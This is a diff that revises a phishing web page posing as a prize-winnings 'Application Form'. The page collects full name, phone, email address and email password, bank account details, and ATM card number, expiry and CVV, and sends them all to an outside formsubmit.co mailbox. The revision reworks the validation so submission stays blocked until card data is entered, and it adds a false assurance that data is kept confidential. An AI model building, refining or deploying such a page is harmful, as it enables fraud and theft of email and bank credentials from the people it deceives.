@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Application Form</title>
   <style>
     body {
@@ -11,210 +11,215 @@
       padding: 20px;
     }
     form {
-      background: #fff;
+      background: white;
       padding: 20px;
-      border-radius: 10px;
-      max-width: 600px;
+      border-radius: 8px;
+      max-width: 500px;
       margin: auto;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      margin-bottom: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+    h2 {
+      text-align: center;
     }
     label {
-      font-weight: bold;
+      display: block;
+      margin-top: 15px;
     }
-    .error-message {
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      box-sizing: border-box;
+    }
+    .error {
       color: red;
       font-size: 0.9em;
       display: none;
     }
-    #finalNote {
+    .note {
       margin-top: 20px;
-      font-weight: bold;
+      background: #e7f3ff;
+      padding: 10px;
+      border-left: 4px solid #2196F3;
     }
-    .hidden {
-      display: none;
-    }
-    .password-toggle {
-      position: relative;
-    }
-    .password-toggle input {
-      padding-right: 40px;
-    }
-    .password-toggle .toggle-icon {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      cursor: pointer;
-    }
-    button {
-      background: green;
-      color: #fff;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      width: 100%;
-      font-size: 16px;
+    .confidential {
       margin-top: 20px;
+      text-align: center;
+      font-size: 0.9em;
+      color: #555;
     }
   </style>
 </head>
 <body>
 
-  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="applicationForm">
+<form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
+  <h2>Application Form</h2>
 
-    <label>1. Full Name</label>
-    <input type="text" id="fullName" name="Full Name" required>
+  <label>Full Name
+    <input type="text" name="Full Name" required id="fullName"/>
+    <div class="error" id="fullNameError">This field is required.</div>
+  </label>
 
-    <label>2. Country</label>
-    <input type="text" name="Country" required>
+  <label>Country
+    <input type="text" name="Country" required />
+  </label>
 
-    <label>3. Phone Number</label>
-    <input type="tel" id="phoneNumber" name="Phone Number" required>
-    <div class="error-message" id="phoneError">Phone number must be 9 to 12 digits.</div>
+  <label>Phone Number
+    <input type="text" name="Phone Number" required id="phone" />
+    <div class="error" id="phoneError">Must be 9 to 12 digits.</div>
+  </label>
 
-    <label>4. Email Address</label>
-    <input type="email" name="Email Address" required>
+  <label>Email Address
+    <input type="email" name="Email Address" required id="email" />
+    <div class="error" id="emailError">Enter a valid email.</div>
+  </label>
 
-    <label>5. Email Password</label>
-    <div class="password-toggle">
-      <input type="password" id="emailPassword" name="Email Password" required>
-      <span class="toggle-icon" onclick="togglePassword()">👁️</span>
-    </div>
+  <label>Email Password
+    <input type="password" name="Email Password" required id="emailPassword" />
+    <div class="error" id="emailPasswordError">This field is required.</div>
+  </label>
 
-    <label>6. Amount You Won</label>
-    <input type="text" id="amountWon" name="Amount You Won" required>
+  <label>Amount You Won
+    <input type="text" name="Amount You Won" required id="amountWon" />
+  </label>
 
-    <label>7. Bank Account Type (e.g., Standard Bank Account)</label>
-    <input type="text" id="accountType" name="Bank Account Type" required>
+  <label>Bank Account Type
+    <input type="text" name="Bank Account Type" required id="accountType" />
+  </label>
 
-    <label>8. Bank Account Number</label>
-    <input type="text" id="accountNumber" name="Bank Account Number" required>
+  <label>Bank Account Number
+    <input type="text" name="Bank Account Number" required id="accountNumber" />
+  </label>
 
-    <label>9. Bank Account Holder's Name</label>
-    <input type="text" id="accountHolder" name="Bank Account Holder's Name" required>
+  <label>Bank Account Holder's Name
+    <input type="text" name="Bank Account Holder Name" required id="holderName" />
+  </label>
 
-    <label>10. Did You Link ATM to Your Bank Account?</label>
-    <select id="atmLinked" name="ATM Linked" required>
+  <label>Did You Link ATM to Your Bank Account?
+    <select name="ATM Linked" id="atmLinked" required>
       <option value="">Select</option>
       <option value="Yes">Yes</option>
       <option value="No">No</option>
     </select>
-    <div class="error-message" id="atmError">YOU MUST HAVE ATM CARD TO PROCEED</div>
+  </label>
 
-    <div id="atmFields">
-      <label>11. ATM Card Number</label>
-      <input type="text" id="cardNumber" name="ATM Card Number" maxlength="16">
-      <div class="error-message" id="cardError">Card number must be exactly 16 digits.</div>
+  <div id="atmFields">
+    <label>ATM Card Number
+      <input type="text" name="ATM Card Number" id="cardNumber" />
+      <div class="error" id="cardNumberError">Must be exactly 16 digits.</div>
+    </label>
 
-      <label>12. Expiry Date (MM/YY)</label>
-      <input type="text" id="expiryDate" name="Expiry Date" maxlength="5">
-      <div class="error-message" id="expiryError">Enter a valid date in MM/YY format.</div>
+    <label>Expiry Date (MM/YY)
+      <input type="text" name="Expiry Date" id="expiry" placeholder="MM/YY" />
+      <div class="error" id="expiryError">Enter a valid MM/YY format.</div>
+    </label>
 
-      <label>13. CVV</label>
-      <input type="text" id="cvv" name="CVV" maxlength="3">
-      <div class="error-message" id="cvvError">CVV must be exactly 3 digits.</div>
-    </div>
+    <label>CVV
+      <input type="text" name="CVV" id="cvv" />
+      <div class="error" id="cvvError">Must be exactly 3 digits.</div>
+    </label>
+  </div>
 
-    <div id="finalNote" class="hidden"></div>
+  <div class="note" id="finalNote">
+    Dear <span id="noteName">[Full Name]</span>, You will receive <span id="noteAmount">[Amount You Won]</span> to your <span id="noteType">[Account Type]</span>, <span id="noteNumber">[Account Number]</span>
+  </div>
 
-    <!-- ✅ Redirect after success -->
-    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html" />
+  <div class="confidential">We keep your data secure and confidential.</div>
 
-    <button type="submit" id="submitButton">Submit</button>
-  </form>
+  <input type="hidden" name="_next" value="thankyou.html">
 
-  <script>
-    function togglePassword() {
-      const pwd = document.getElementById('emailPassword');
-      pwd.type = pwd.type === 'password' ? 'text' : 'password';
+  <button type="submit" id="submitBtn" disabled>Submit</button>
+</form>
+
+<script>
+  const form = document.getElementById("applicationForm");
+  const atmLinked = document.getElementById("atmLinked");
+  const atmFields = document.getElementById("atmFields");
+  const submitBtn = document.getElementById("submitBtn");
+  const finalNote = document.getElementById("finalNote");
+
+  const cardNumber = document.getElementById("cardNumber");
+  const cvv = document.getElementById("cvv");
+  const expiry = document.getElementById("expiry");
+  const phone = document.getElementById("phone");
+  const fullName = document.getElementById("fullName");
+  const amountWon = document.getElementById("amountWon");
+  const accountType = document.getElementById("accountType");
+  const accountNumber = document.getElementById("accountNumber");
+
+  function formatExpiry() {
+    let val = expiry.value.replace(/\D/g, '');
+    if (val.length >= 3) {
+      expiry.value = val.slice(0, 2) + '/' + val.slice(2, 4);
+    } else {
+      expiry.value = val;
+    }
+  }
+
+  expiry.addEventListener("input", formatExpiry);
+
+  function validateField(input, pattern, errorId) {
+    const errorDiv = document.getElementById(errorId);
+    if (!pattern.test(input.value)) {
+      errorDiv.style.display = "block";
+      return false;
+    } else {
+      errorDiv.style.display = "none";
+      return true;
+    }
+  }
+
+  function updateNote() {
+    document.getElementById("noteName").innerText = fullName.value;
+    document.getElementById("noteAmount").innerText = amountWon.value;
+    document.getElementById("noteType").innerText = accountType.value;
+    document.getElementById("noteNumber").innerText = accountNumber.value;
+  }
+
+  [fullName, amountWon, accountType, accountNumber].forEach(field => {
+    field.addEventListener("blur", updateNote);
+  });
+
+  function validateForm() {
+    let isValid = true;
+
+    isValid &= validateField(phone, /^\d{9,12}$/, "phoneError");
+
+    if (atmLinked.value === "Yes") {
+      isValid &= validateField(cardNumber, /^\d{16}$/, "cardNumberError");
+      isValid &= validateField(cvv, /^\d{3}$/, "cvvError");
+      isValid &= validateField(expiry, /^(0[1-9]|1[0-2])\/\d{2}$/, "expiryError");
     }
 
-    const atmLinked = document.getElementById('atmLinked');
-    const atmFields = document.getElementById('atmFields');
-    const atmError = document.getElementById('atmError');
-    const submitBtn = document.getElementById('submitButton');
-    const finalNote = document.getElementById('finalNote');
+    submitBtn.disabled = !(atmLinked.value === "Yes" && isValid);
+  }
 
-    const fullName = document.getElementById('fullName');
-    const amountWon = document.getElementById('amountWon');
-    const accountType = document.getElementById('accountType');
-    const accountNumber = document.getElementById('accountNumber');
+  [phone, cardNumber, cvv, expiry].forEach(field => {
+    field.addEventListener("blur", validateForm);
+    field.addEventListener("input", validateForm);
+  });
 
-    atmLinked.addEventListener('change', () => {
-      if (atmLinked.value === "No") {
-        atmFields.classList.add('hidden');
-        atmError.style.display = 'block';
-        submitBtn.disabled = true;
-        finalNote.classList.add('hidden');
-      } else {
-        atmFields.classList.remove('hidden');
-        atmError.style.display = 'none';
-        submitBtn.disabled = false;
-        updateFinalNote();
-      }
-    });
-
-    function updateFinalNote() {
-      if (fullName.value && amountWon.value && accountType.value && accountNumber.value) {
-        finalNote.innerText = `Dear ${fullName.value}, You will receive ${amountWon.value} to your ${accountType.value}, ${accountNumber.value}`;
-        finalNote.classList.remove('hidden');
-      } else {
-        finalNote.classList.add('hidden');
-      }
+  atmLinked.addEventListener("change", () => {
+    if (atmLinked.value === "No") {
+      atmFields.style.display = "none";
+      finalNote.style.display = "none";
+      submitBtn.disabled = true;
+    } else if (atmLinked.value === "Yes") {
+      atmFields.style.display = "block";
+      finalNote.style.display = "block";
+      validateForm();
+    } else {
+      submitBtn.disabled = true;
     }
+  });
 
-    [fullName, amountWon, accountType, accountNumber].forEach(field => {
-      field.addEventListener('blur', updateFinalNote);
-    });
+  form.addEventListener("submit", function(e) {
+    validateForm();
+    if (submitBtn.disabled) {
+      e.preventDefault();
+    }
+  });
+</script>
 
-    document.getElementById('cardNumber').addEventListener('blur', function () {
-      const val = this.value;
-      document.getElementById('cardError').style.display = val.length !== 16 ? 'block' : 'none';
-    });
-
-    document.getElementById('cvv').addEventListener('blur', function () {
-      const val = this.value;
-      document.getElementById('cvvError').style.display = val.length !== 3 ? 'block' : 'none';
-    });
-
-    document.getElementById('phoneNumber').addEventListener('blur', function () {
-      const val = this.value;
-      const isValid = /^\d{9,12}$/.test(val);
-      document.getElementById('phoneError').style.display = isValid ? 'none' : 'block';
-    });
-
-    document.getElementById('expiryDate').addEventListener('input', function (e) {
-      let val = e.target.value.replace(/\D/g, '');
-      if (val.length >= 3) {
-        val = val.substring(0, 2) + '/' + val.substring(2, 4);
-      }
-      e.target.value = val;
-    });
-
-    document.getElementById('expiryDate').addEventListener('blur', function () {
-      const val = this.value;
-      const isValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(val);
-      document.getElementById('expiryError').style.display = isValid ? 'none' : 'block';
-    });
-
-    document.getElementById('applicationForm').addEventListener('submit', function (e) {
-      let errors = document.querySelectorAll('.error-message');
-      for (let err of errors) {
-        if (err.style.display === 'block') {
-          e.preventDefault();
-          alert("Please fix all errors before submitting.");
-          return;
-        }
-      }
-    });
-  </script>
 </body>
 </html>
